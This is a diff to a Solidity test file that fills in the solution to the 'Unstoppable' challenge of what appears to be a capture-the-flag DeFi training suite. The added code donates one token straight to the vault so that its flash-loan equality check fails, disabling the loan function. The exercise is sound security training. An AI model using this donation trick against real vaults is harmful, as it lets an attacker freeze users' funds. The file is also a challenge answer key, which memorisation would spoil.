@@ -91,9 +91,12 @@ contract UnstoppableChallenge is Test {
     // Write your attack here — this is the only function you need to change
     ////////////////////////////////////////////////////////////////////////
     function test_unstoppable() public checkSolvedByPlayer {
-        // Hint: you are holding 10 DVT. What assumption does the vault make about its own balance?
-        //
-        // TODO: your code goes here
+        // A direct donation increases assets without minting any ERC-4626 shares.
+        // The flash-loan equality check then fails despite the vault having MORE backing.
+        token.transfer(address(vault), 1);
+        assertEq(vault.totalAssets(), TOKENS_IN_VAULT + 1);
+        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
+        assertTrue(vault.convertToShares(vault.totalSupply()) != vault.totalAssets());
     }
 
     ////////////////////////////////////////////////////////////////////////
